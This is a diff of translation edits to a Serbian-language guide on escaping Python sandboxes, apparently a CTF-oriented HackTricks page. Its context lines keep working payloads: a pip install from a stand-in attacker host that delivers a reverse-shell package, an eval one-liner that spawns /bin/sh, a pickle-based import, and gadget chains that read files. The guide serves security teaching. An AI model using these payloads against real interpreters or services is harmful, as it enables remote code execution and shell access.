@@ -41,7 +41,7 @@ system('ls')
 ```
 Zapamtite da funkcije _**open**_ i _**read**_ mogu biti korisne za **čitati fajlove** unutar python sandboksa i za **pisanje nekog koda** koji možete **izvršiti** da **obiđete** sandbox.
 
-> [!CAUTION] > Funkcija **Python2 input()** omogućava izvršavanje python koda pre nego što program sruši.
+> [!CAUTION] > **Python2 input()** funkcija omogućava izvršavanje python koda pre nego što program sruši.
 
 Python pokušava da **učita biblioteke iz trenutnog direktorijuma prvo** (sledeća komanda će odštampati odakle python učitava module): `python3 -c 'import sys; print(sys.path)'`
 
@@ -51,7 +51,7 @@ Python pokušava da **učita biblioteke iz trenutnog direktorijuma prvo** (slede
 
 ### Podrazumevani paketi
 
-Možete pronaći **spisak unapred instaliranih** paketa ovde: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Možete pronaći **listu unapred instaliranih** paketa ovde: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Imajte na umu da iz picklea možete učiniti da python okruženje **uvozi proizvoljne biblioteke** instalirane u sistemu.\
 Na primer, sledeći pickle, kada se učita, će uvesti pip biblioteku da je koristi:
 ```python
@@ -77,7 +77,7 @@ Ako imate pristup `pip` ili `pip.main()`, možete instalirati proizvoljan paket 
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Možete preuzeti paket za kreiranje reverzne ljuske ovde. Imajte na umu da pre nego što ga koristite treba da **dekompresujete, promenite `setup.py` i stavite svoju IP adresu za reverznu ljusku**:
+Možete preuzeti paket za kreiranje reverzne ljuske ovde. Imajte na umu da pre korišćenja treba da **dekompresujete, promenite `setup.py` i stavite svoju IP adresu za reverznu ljusku**:
 
 {{#file}}
 Reverse.tar (1).gz
@@ -135,7 +135,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypassovanje zaštita kroz kodiranja (UTF-7)
+## Bypass zaštita kroz kodiranja (UTF-7)
 
 U [**ovoj analizi**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 se koristi za učitavanje i izvršavanje proizvoljnog python koda unutar naizgled sandboks okruženja:
 ```python
@@ -178,7 +178,7 @@ class _:pass
 ```
 ### RCE kreiranje objekata i preopterećenje
 
-Ako možete **deklarisati klasu** i **napraviti objekat** te klase, mogli biste **pisati/prepisivati različite metode** koje mogu biti **pokrenute** **bez** **potrebe da ih direktno pozivate**.
+Ako možete **deklarisati klasu** i **napraviti objekat** te klase, mogli biste **pisati/prepisivati različite metode** koje mogu biti **pokrenute** **bez** **potrebe da ih pozivate direktno**.
 
 #### RCE sa prilagođenim klasama
 
@@ -293,7 +293,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Čitajte datoteku uz pomoć builtins i licencu
+### Čitajte datoteku uz pomoć ugrađenih funkcija i licence
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -307,7 +307,7 @@ pass
 - [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 - [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-Ako možete pristupiti **`__builtins__`** objektu, možete uvesti biblioteke (primetite da možete koristiti i ovde drugu string reprezentaciju prikazanu u poslednjem odeljku):
+Ako možete pristupiti **`__builtins__`** objektu, možete uvesti biblioteke (primetite da možete koristiti i druge string reprezentacije prikazane u poslednjem odeljku):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -315,7 +315,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### No Builtins
 
 Kada nemate `__builtins__`, nećete moći da uvezete ništa niti čak da čitate ili pišete fajlove jer **sve globalne funkcije** (kao što su `open`, `import`, `print`...) **nisu učitane**.\
-Međutim, **po defaultu, python uvozi mnogo modula u memoriju**. Ovi moduli mogu delovati benigno, ali neki od njih **takođe uvoze opasne** funkcionalnosti unutar sebe koje se mogu iskoristiti za dobijanje čak i **arbitrarne izvršne** koda.
+Međutim, **po defaultu, python učitava mnogo modula u memoriju**. Ovi moduli mogu delovati benigno, ali neki od njih **takođe uvoze opasne** funkcionalnosti unutar sebe koje se mogu iskoristiti za dobijanje čak i **arbitrarne izvršne** koda.
 
 U sledećim primerima možete posmatrati kako da **zloupotrebite** neke od ovih "**benignih**" modula učitanih da **pristupite** **opasnim** **funkcionalnostima** unutar njih.
 
@@ -535,10 +535,10 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## Rekurzivna pretraga Builtins, Globals...
+## Rekurzivno pretraživanje Builtins, Globals...
 
 > [!WARNING]
-> Ovo je jednostavno **neverovatno**. Ako **tražite objekat kao što su globals, builtins, open ili bilo šta** jednostavno koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat.**
+> Ovo je jednostavno **neverovatno**. Ako **tražite objekat kao što su globals, builtins, open ili bilo šta** samo koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -712,7 +712,7 @@ return 'HAL 9000'
 ../python-internal-read-gadgets.md
 {{#endref}}
 
-### Payload-ovi za otkrivanje osetljivih informacija
+### Osetljive informacije o otkrivanju payload-a
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -741,7 +741,7 @@ Kao podsetnik, svaki put kada se izvrši neka akcija u pythonu, neka funkcija se
 Imate više ovakvih u sekciji [**Python execution without calls**](#python-execution-without-calls).
 
 Ranjivost format string u pythonu ne omogućava izvršavanje funkcije (ne dozvoljava korišćenje zagrada), tako da nije moguće dobiti RCE kao `'{0.system("/bin/sh")}'.format(os)`.\
-Međutim, moguće je koristiti `[]`. Stoga, ako neka uobičajena python biblioteka ima **`__getitem__`** ili **`__getattr__`** metodu koja izvršava proizvoljan kod, moguće je zloupotrebiti ih da se dobije RCE.
+Međutim, moguće je koristiti `[]`. Stoga, ako neka uobičajena python biblioteka ima metodu **`__getitem__`** ili **`__getattr__`** koja izvršava proizvoljan kod, moguće je zloupotrebiti ih da se dobije RCE.
 
 Tražeći takav gadget u pythonu, writeup predlaže ovu [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Gde je pronašao ovu [jednu](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 ```python
@@ -776,7 +776,7 @@ Izazov zapravo koristi drugu ranjivost na serveru koja omogućava kreiranje proi
 > [!TIP]
 > Ako želite da **naučite** o **python bytecode** detaljno, pročitajte ovaj **sjajan** post o toj temi: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-U nekim CTF-ovima možete dobiti ime **prilagođene funkcije u kojoj se nalazi flag** i potrebno je da vidite **unutrašnjost** **funkcije** da biste ga izvukli.
+U nekim CTF-ovima možete dobiti ime **prilagođene funkcije u kojoj se nalazi flag** i potrebno je da pogledate **unutrašnjost** **funkcije** da biste ga izvukli.
 
 Ovo je funkcija koju treba ispitati:
 ```python
@@ -807,7 +807,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Pogledajte ovde više mesta za dobijanje globalnih**](#globals-and-locals)
+[**Pogledajte ovde više mesta za dobijanje globals**](#globals-and-locals)
 
 ### **Pristupanje kodu funkcije**
 
@@ -899,7 +899,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Obratite pažnju da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj varijabli koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje offset varijable koja se učitava.
+Obratite pažnju da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj promenljivih koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje offset promenljive koja se učitava.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -923,8 +923,8 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Kompajliranje Pythona
 
-Sada, zamislite da nekako možete **izvući informacije o funkciji koju ne možete izvršiti** ali vam **je potrebno** da je **izvršite**.\
-Kao u sledećem primeru, možete **pristupiti kod objektu** te funkcije, ali samo čitajući disasembler ne **znate kako da izračunate zastavicu** (_zamislite složeniju `calc_flag` funkciju_)
+Sada, zamislite da nekako možete **izvući informacije o funkciji koju ne možete izvršiti** ali vam je **potrebno** da je **izvršite**.\
+Kao u sledećem primeru, možete **pristupiti kod objektu** te funkcije, ali samo čitajući disasembler ne znate kako da izračunate flag** (_zamislite složeniju `calc_flag` funkciju_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -970,7 +970,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ### Rekreiranje provaljene funkcije
 
 > [!WARNING]
-> U sledećem primeru, uzet ćemo sve podatke potrebne za rekreiranje funkcije direktno iz objekta funkcije. U **pravom primeru**, sve **vrednosti** za izvršavanje funkcije **`code_type`** su ono što **ćete morati da provalite**.
+> U sledećem primeru, uzet ćemo sve podatke potrebne za rekreiranje funkcije direktno iz objekta koda funkcije. U **pravom primeru**, sve **vrednosti** za izvršavanje funkcije **`code_type`** su ono što **ćete morati da prokrijumčarite**.
 ```python
 fc = get_flag.__code__
 # In a real situation the values like fc.co_argcount are the ones you need to leak
